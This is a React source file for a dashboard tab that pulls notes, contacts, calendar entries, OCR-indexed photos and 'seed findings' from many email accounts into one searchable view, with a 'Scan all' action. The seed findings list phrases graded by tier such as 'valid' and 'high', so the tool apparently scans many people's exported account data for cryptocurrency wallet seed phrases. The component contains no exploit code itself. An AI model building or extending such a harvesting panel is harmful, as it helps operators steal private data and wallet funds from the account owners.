import { useEffect, useRef, useState } from "react";
import { fileUrl, getLibrary, getText, timeAgo } from "./api.js";
import { Badge, Empty, Section, Spinner, displayName } from "./ui.jsx";
import Lightbox from "./Lightbox.jsx";

/* Everything from every account in one place: notes, contacts, calendar,
 * images (with OCR) and seed findings.  Read-only; the catalog is built and
 * cached by the web process. */

const TYPES = [
  ["all", "All"],
  ["notes", "Notes"],
  ["photos", "Photos"],
  ["contacts", "Contacts"],
  ["calendar", "Calendar"],
  ["seeds", "Seeds"],
];

const HEIC = /\.(heic|heif)$/i;
const TIER_TONE = { valid: "green", high: "red", medium: "yellow", minimum: "blue", low: "gray" };

function AccountTag({ item }) {
  return (
    <span className="truncate text-[10px] text-[#6e6e73]" title={item.email}>
      {item.email}
    </span>
  );
}

function PhotoTile({ item, onOpen }) {
  const placeholder = !item.thumb && HEIC.test(item.name);
  const src = item.thumb || (!HEIC.test(item.name) ? item.path : "");
  return (
    <button
      type="button"
      onClick={onOpen}
      className="overflow-hidden rounded-[10px] border border-[#e5e5ea] bg-white text-left hover:border-[#0071e3]"
    >
      <div className="relative aspect-square bg-[#f5f5f7]">
        {item.video && !item.thumb ? (
          <div className="flex h-full items-center justify-center text-[26px]">▶</div>
        ) : src ? (
          <img
            loading="lazy"
            src={fileUrl(item.accountId, src)}
            alt={item.name}
            className="h-full w-full object-cover"
          />
        ) : (
          <div className="flex h-full flex-col items-center justify-center gap-1 text-[11px] text-[#6e6e73]">
            <span className="text-[22px]">🖼️</span>
            {placeholder ? "HEIC" : "preview"}
          </div>
        )}
        <span
          className={`absolute left-1 top-1 rounded-full px-1.5 py-0.5 text-[9px] font-semibold uppercase ${
            item.ocr ? "bg-[#edf8f0] text-[#1d7a3a]" : "bg-[#fff8e6] text-[#8a6100]"
          }`}
        >
          {item.ocr ? "OCR" : "pending"}
        </span>
      </div>
      <div className="p-2">
        <div className="truncate text-[11px] font-medium">{displayName(item.name)}</div>
        <AccountTag item={item} />
      </div>
    </button>
  );
}

function Pager({ page, pages, onPage }) {
  if (pages <= 1) return null;
  return (
    <div className="mt-3 flex items-center justify-end gap-2 text-[11px] text-[#6e6e73]">
      <span>
        page {page}/{pages}
      </span>
      <button
        type="button"
        disabled={page <= 1}
        onClick={() => onPage(page - 1)}
        className="rounded border border-[#d2d2d7] px-2 py-0.5 disabled:opacity-30"
      >
        ‹
      </button>
      <button
        type="button"
        disabled={page >= pages}
        onClick={() => onPage(page + 1)}
        className="rounded border border-[#d2d2d7] px-2 py-0.5 disabled:opacity-30"
      >
        ›
      </button>
    </div>
  );
}

function ContactsTable({ items }) {
  return (
    <div className="overflow-x-auto">
      <table className="w-full border-collapse text-left text-[12px]">
        <thead>
          <tr className="border-b border-[#e5e5ea] text-[10px] uppercase tracking-[0.05em] text-[#6e6e73]">
            <th className="px-3 py-2 font-medium">Name</th>
            <th className="px-3 py-2 font-medium">Phones</th>
            <th className="px-3 py-2 font-medium">Emails</th>
            <th className="px-3 py-2 font-medium">Company</th>
            <th className="px-3 py-2 font-medium">Note</th>
            <th className="px-3 py-2 font-medium">Account</th>
          </tr>
        </thead>
        <tbody>
          {items.map((item, index) => (
            <tr key={`${item.accountId}-${item.name}-${index}`} className="border-b border-[#f4f4f6] last:border-0">
              <td className="px-3 py-2 font-medium">{item.name}</td>
              <td className="px-3 py-2 font-mono text-[11px] text-[#424245]">{item.phones.join(", ") || "—"}</td>
              <td className="px-3 py-2 text-[#424245]">{item.emails.join(", ") || "—"}</td>
              <td className="px-3 py-2 text-[#6e6e73]">{item.company || "—"}</td>
              <td className="px-3 py-2 text-[#6e6e73]" title={item.note}>
                {item.note.length > 90 ? `${item.note.slice(0, 90)}…` : item.note || "—"}
              </td>
              <td className="max-w-[180px] px-3 py-2">
                <AccountTag item={item} />
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function CalendarTable({ items }) {
  return (
    <div className="overflow-x-auto">
      <table className="w-full border-collapse text-left text-[12px]">
        <thead>
          <tr className="border-b border-[#e5e5ea] text-[10px] uppercase tracking-[0.05em] text-[#6e6e73]">
            <th className="px-3 py-2 font-medium">Title</th>
            <th className="px-3 py-2 font-medium">When</th>
            <th className="px-3 py-2 font-medium">Notes</th>
            <th className="px-3 py-2 font-medium">Account</th>
          </tr>
        </thead>
        <tbody>
          {items.map((item, index) => (
            <tr key={`${item.accountId}-${item.title}-${index}`} className="border-b border-[#f4f4f6] last:border-0">
              <td className="px-3 py-2 font-medium">
                {item.title}
                {item.kind === "reminder" ? (
                  <Badge tone="gray" className="ml-1">
                    reminder
                  </Badge>
                ) : null}
              </td>
              <td className="px-3 py-2 font-mono text-[11px] text-[#424245]">{item.when || "—"}</td>
              <td className="px-3 py-2 text-[#6e6e73]">{item.notes || "—"}</td>
              <td className="max-w-[180px] px-3 py-2">
                <AccountTag item={item} />
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

export default function LibraryTab({ admin }) {
  const [type, setType] = useState("all");
  const [text, setText] = useState("");
  const [query, setQuery] = useState("");
  const [accountId, setAccountId] = useState("");
  const [page, setPage] = useState(1);
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [note, setNote] = useState(null);
  const [noteBusy, setNoteBusy] = useState(false);
  const [open, setOpen] = useState(null);
  const [tick, setTick] = useState(0);
  const [flash, setFlash] = useState("");
  const dataRef = useRef(null);
  const forcedRef = useRef(0);

  useEffect(() => {
    dataRef.current = data;
  }, [data]);

  useEffect(() => {
    const timer = setTimeout(() => setQuery(text.trim()), 300);
    return () => clearTimeout(timer);
  }, [text]);

  useEffect(() => {
    setPage(1);
    setOpen(null);
  }, [type, query, accountId]);

  // Keep the view live while scans run; one forced rebuild per minute.
  useEffect(() => {
    const timer = setInterval(() => setTick((value) => value + 1), 30_000);
    return () => clearInterval(timer);
  }, []);

  useEffect(() => {
    let alive = true;
    if (!dataRef.current) setLoading(true);
    setError("");
    const scanning = (dataRef.current?.counts?.scanning ?? 0) > 0;
    const force = scanning && Date.now() - forcedRef.current > 60_000;
    if (force) forcedRef.current = Date.now();
    getLibrary({
      type,
      q: query,
      accountId,
      page,
      meta: 1,
      refresh: force ? "1" : "",
    })
      .then((result) => {
        if (!alive) return;
        setData(result);
        setLoading(false);
      })
      .catch((failure) => {
        if (!alive) return;
        setError(failure.message);
        setLoading(false);
      });
    return () => {
      alive = false;
    };
  }, [type, query, accountId, page, tick]);

  const counts = data?.counts ?? {};
  const totals = data?.totals ?? {};
  const photos = type === "all" ? data?.items?.photos ?? [] : type === "photos" ? data?.items ?? [] : [];

  async function openNote(item) {
    setNote({ item, body: "" });
    setNoteBusy(true);
    try {
      const body = await getText(fileUrl(item.accountId, item.path));
      setNote({ item, body });
    } catch (failure) {
      setNote({ item, body: `Could not read this note: ${failure.message}` });
    } finally {
      setNoteBusy(false);
    }
  }

  async function scanAll() {
    setFlash("");
    try {
      const result = await admin.scanAll();
      setFlash(`Queued ${result.queued} · already running ${result.reused}`);
      setTimeout(() => setTick((value) => value + 1), 5000);
    } catch (failure) {
      setFlash(failure.message);
    }
  }

  function pickType(next) {
    setType(next);
  }

  return (
    <div className="h-full overflow-y-auto bg-[#f5f5f7]">
      <div className="sticky top-0 z-10 border-b border-[#e5e5ea] bg-white/95 px-4 py-3 backdrop-blur">
        <div className="flex flex-wrap items-center gap-2">
          <h2 className="mr-1 text-[16px] font-semibold tracking-[-0.2px]">All notes &amp; images</h2>
          <input
            value={text}
            onChange={(event) => setText(event.target.value)}
            placeholder="Search every note, image (OCR), contact, calendar entry and seed…"
            className="h-9 min-w-[240px] flex-1 rounded-[9px] border border-[#d2d2d7] bg-white px-3 text-[13px] outline-none focus:border-[#0071e3]"
          />
          <select
            value={accountId}
            onChange={(event) => setAccountId(event.target.value)}
            className="h-9 max-w-[240px] rounded-[9px] border border-[#d2d2d7] bg-white px-2 text-[12px] outline-none focus:border-[#0071e3]"
          >
            <option value="">All accounts</option>
            {(data?.accounts ?? []).map((account) => (
              <option key={account.id} value={account.id}>
                {account.email}
                {account.hidden ? " (hidden)" : ""}
              </option>
            ))}
          </select>
          <button
            type="button"
            onClick={() => {
              forcedRef.current = Date.now();
              setTick((value) => value + 1);
            }}
            className="h-9 rounded-[9px] border border-[#d2d2d7] px-3 text-[12px]"
          >
            Refresh
          </button>
          <button
            type="button"
            onClick={scanAll}
            className="h-9 rounded-[9px] bg-[#0071e3] px-3 text-[12px] font-medium text-white"
          >
            Scan all
          </button>
        </div>
        <div className="mt-2 flex flex-wrap items-center gap-1">
          {TYPES.map(([id, label]) => (
            <button
              key={id}
              type="button"
              onClick={() => pickType(id)}
              className={`h-6 rounded-full px-2.5 text-[10px] font-medium ${
                type === id ? "bg-[#eef5ff] text-[#0058b0]" : "text-[#6e6e73] hover:bg-[#f5f5f7]"
              }`}
            >
              {label}
            </button>
          ))}
          <span className="ml-auto text-[10px] text-[#6e6e73]">
            {counts.notes ?? 0} notes · {counts.photos ?? 0} images · OCR {counts.ocrDone ?? 0}/
            {(counts.ocrDone ?? 0) + (counts.ocrPending ?? 0)} · {counts.contacts ?? 0} contacts ·{" "}
            {counts.seeds ?? 0} findings · indexed {timeAgo(data?.builtAt)}
          </span>
        </div>
        {flash ? <p className="mt-2 text-[11px] text-[#0058b0]">{flash}</p> : null}
        {error ? (
          <p className="mt-2 rounded-[8px] bg-[#fff2f2] px-3 py-2 text-[12px] text-[#c4000a]">{error}</p>
        ) : null}
      </div>

      <div className="p-4">
        {loading && !data ? <Spinner label="Indexing every account" /> : null}

        {!loading && type === "all" ? (
          <div className="grid gap-3">
            <div className="grid gap-3 sm:grid-cols-2">
              <button
                type="button"
                onClick={() => pickType("notes")}
                className="rounded-[14px] border border-[#e5e5ea] bg-white p-5 text-left hover:border-[#0071e3]"
              >
                <div className="text-[11px] uppercase tracking-[0.05em] text-[#6e6e73]">All notes</div>
                <div className="mt-1 text-[28px] font-semibold">{counts.notes ?? 0}</div>
                <div className="text-[12px] text-[#6e6e73]">every account · searchable text</div>
              </button>
              <button
                type="button"
                onClick={() => pickType("photos")}
                className="rounded-[14px] border border-[#e5e5ea] bg-white p-5 text-left hover:border-[#0071e3]"
              >
                <div className="text-[11px] uppercase tracking-[0.05em] text-[#6e6e73]">All images</div>
                <div className="mt-1 text-[28px] font-semibold">{counts.photos ?? 0}</div>
                <div className="text-[12px] text-[#6e6e73]">
                  OCR {counts.ocrDone ?? 0} done · {counts.ocrPending ?? 0} pending · searchable
                </div>
              </button>
            </div>

            <Section
              title={`Notes (${totals.notes ?? 0})`}
              right={
                <button type="button" onClick={() => pickType("notes")} className="text-[11px] text-[#0066cc]">
                  See all
                </button>
              }
            >
              <div className="grid gap-2 p-3 lg:grid-cols-2">
                {(data?.items?.notes ?? []).map((item) => (
                  <button
                    key={`${item.accountId}-${item.path}`}
                    type="button"
                    onClick={() => openNote(item)}
                    className="rounded-[10px] border border-[#e5e5ea] p-3 text-left hover:border-[#0071e3]"
                  >
                    <div className="flex items-center justify-between gap-2">
                      <span className="truncate text-[12px] font-medium">{item.title || item.name}</span>
                      <AccountTag item={item} />
                    </div>
                    <p className="mt-1 line-clamp-2 text-[11px] leading-4 text-[#6e6e73]">
                      {item.text.slice(0, 220)}
                    </p>
                  </button>
                ))}
              </div>
            </Section>

            <Section
              title={`Images (${totals.photos ?? 0})`}
              right={
                <button type="button" onClick={() => pickType("photos")} className="text-[11px] text-[#0066cc]">
                  See all
                </button>
              }
            >
              <div className="grid grid-cols-2 gap-2 p-3 sm:grid-cols-3 lg:grid-cols-6">
                {photos.map((item, index) => (
                  <PhotoTile key={`${item.accountId}-${item.path}`} item={item} onOpen={() => setOpen(index)} />
                ))}
              </div>
            </Section>

            <Section
              title={`Contacts (${totals.contacts ?? 0})`}
              right={
                <button type="button" onClick={() => pickType("contacts")} className="text-[11px] text-[#0066cc]">
                  See all
                </button>
              }
            >
              <ContactsTable items={data?.items?.contacts ?? []} />
            </Section>

            <Section
              title={`Calendar & reminders (${totals.calendar ?? 0})`}
              right={
                <button type="button" onClick={() => pickType("calendar")} className="text-[11px] text-[#0066cc]">
                  See all
                </button>
              }
            >
              <CalendarTable items={data?.items?.calendar ?? []} />
            </Section>

            <Section
              title={`Seeds (${totals.seeds ?? 0})`}
              right={
                <button type="button" onClick={() => pickType("seeds")} className="text-[11px] text-[#0066cc]">
                  See all
                </button>
              }
            >
              <div className="divide-y divide-[#f4f4f6]">
                {(data?.items?.seeds ?? []).map((item, index) => (
                  <div key={`${item.accountId}-${item.phrase}-${index}`} className="flex items-center gap-2 px-3 py-2">
                    <Badge tone={TIER_TONE[item.tier] ?? "gray"}>{item.tier}</Badge>
                    <span className="min-w-0 flex-1 truncate font-mono text-[11px]">{item.phrase}</span>
                    <AccountTag item={item} />
                    <a
                      href={fileUrl(item.accountId, item.file, true)}
                      className="shrink-0 text-[11px] text-[#0066cc]"
                    >
                      file
                    </a>
                  </div>
                ))}
              </div>
            </Section>
          </div>
        ) : null}

        {!loading && type === "notes" ? (
          <div className="grid gap-3 lg:grid-cols-[340px_1fr]">
            <div className="overflow-hidden rounded-[12px] border border-[#e5e5ea] bg-white">
              <div className="border-b border-[#f0f0f2] px-3 py-2 text-[11px] text-[#6e6e73]">
                {data?.total ?? 0} notes
              </div>
              <div className="max-h-[620px] overflow-y-auto">
                {(data?.items ?? []).map((item) => (
                  <button
                    key={`${item.accountId}-${item.path}`}
                    type="button"
                    onClick={() => openNote(item)}
                    className={`block w-full border-b border-[#f4f4f6] px-3 py-2 text-left ${
                      note?.item?.path === item.path && note?.item?.accountId === item.accountId
                        ? "bg-[#eef5ff]"
                        : "hover:bg-[#fafafa]"
                    }`}
                  >
                    <div className="truncate text-[12px] font-medium">{item.title || item.name}</div>
                    <div className="flex items-center justify-between gap-2">
                      <AccountTag item={item} />
                      <span className="text-[10px] text-[#9a9aa0]">{timeAgo(item.mtime)}</span>
                    </div>
                    <p className="mt-0.5 line-clamp-2 text-[10px] leading-4 text-[#6e6e73]">
                      {item.text.slice(0, 180)}
                    </p>
                  </button>
                ))}
              </div>
            </div>
            <div className="rounded-[12px] border border-[#e5e5ea] bg-white">
              <div className="flex items-center justify-between gap-2 border-b border-[#f0f0f2] px-3 py-2">
                <span className="min-w-0 truncate text-[12px] font-medium">
                  {note?.item?.title || note?.item?.name || "Select a note"}
                </span>
                {note ? (
                  <a
                    href={fileUrl(note.item.accountId, note.item.path, true)}
                    className="shrink-0 text-[11px] text-[#0066cc]"
                  >
                    Download
                  </a>
                ) : null}
              </div>
              <div className="max-h-[620px] overflow-y-auto p-4">
                {note ? (
                  <>
                    <div className="mb-2 text-[10px] text-[#6e6e73]">{note.item.email}</div>
                    {noteBusy ? (
                      <Spinner label="Reading" />
                    ) : (
                      <pre className="whitespace-pre-wrap font-sans text-[12px] leading-5 text-[#1d1d1f]">
                        {note.body}
                      </pre>
                    )}
                  </>
                ) : (
                  <p className="py-10 text-center text-[12px] text-[#6e6e73]">
                    Pick a note to read it here.
                  </p>
                )}
              </div>
            </div>
          </div>
        ) : null}

        {!loading && type === "photos" ? (
          <div>
            <div className="grid grid-cols-2 gap-2 sm:grid-cols-3 lg:grid-cols-6">
              {(data?.items ?? []).map((item, index) => (
                <PhotoTile key={`${item.accountId}-${item.path}`} item={item} onOpen={() => setOpen(index)} />
              ))}
            </div>
            {!data?.items?.length ? (
              <Empty title="No images">Nothing matches this search, or no export has images yet.</Empty>
            ) : null}
            <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={setPage} />
          </div>
        ) : null}

        {!loading && type === "contacts" ? (
          <div className="rounded-[12px] border border-[#e5e5ea] bg-white">
            {data?.items?.length ? (
              <ContactsTable items={data.items} />
            ) : (
              <Empty title="No contacts">No contacts match this search.</Empty>
            )}
            <div className="px-3 pb-2">
              <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={setPage} />
            </div>
          </div>
        ) : null}

        {!loading && type === "calendar" ? (
          <div className="rounded-[12px] border border-[#e5e5ea] bg-white">
            {data?.items?.length ? (
              <CalendarTable items={data.items} />
            ) : (
              <Empty title="No calendar entries">No events or reminders match this search.</Empty>
            )}
            <div className="px-3 pb-2">
              <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={setPage} />
            </div>
          </div>
        ) : null}

        {!loading && type === "seeds" ? (
          <div className="rounded-[12px] border border-[#e5e5ea] bg-white">
            {data?.items?.length ? (
              <div className="divide-y divide-[#f4f4f6]">
                {data.items.map((item, index) => (
                  <div key={`${item.accountId}-${item.phrase}-${index}`} className="flex items-center gap-2 px-3 py-2">
                    <Badge tone={TIER_TONE[item.tier] ?? "gray"}>{item.tier}</Badge>
                    <span className="min-w-0 flex-1 truncate font-mono text-[11px]">{item.phrase}</span>
                    <span className="hidden shrink-0 text-[10px] text-[#6e6e73] sm:inline">{item.file}</span>
                    <AccountTag item={item} />
                    <a
                      href={fileUrl(item.accountId, item.file, true)}
                      className="shrink-0 text-[11px] text-[#0066cc]"
                    >
                      file
                    </a>
                  </div>
                ))}
              </div>
            ) : (
              <Empty title="No seed findings">
                Run Scan all, then search here. Notes, contacts, calendar and images are all included.
              </Empty>
            )}
            <div className="px-3 pb-2">
              <Pager page={data?.page ?? 1} pages={data?.pages ?? 1} onPage={setPage} />
            </div>
          </div>
        ) : null}
      </div>

      {open !== null && photos[open] ? (
        <Lightbox
          accountId={photos[open].accountId}
          items={photos}
          index={open}
          setIndex={setOpen}
          onClose={() => setOpen(null)}
        />
      ) : null}
    </div>
  );
}
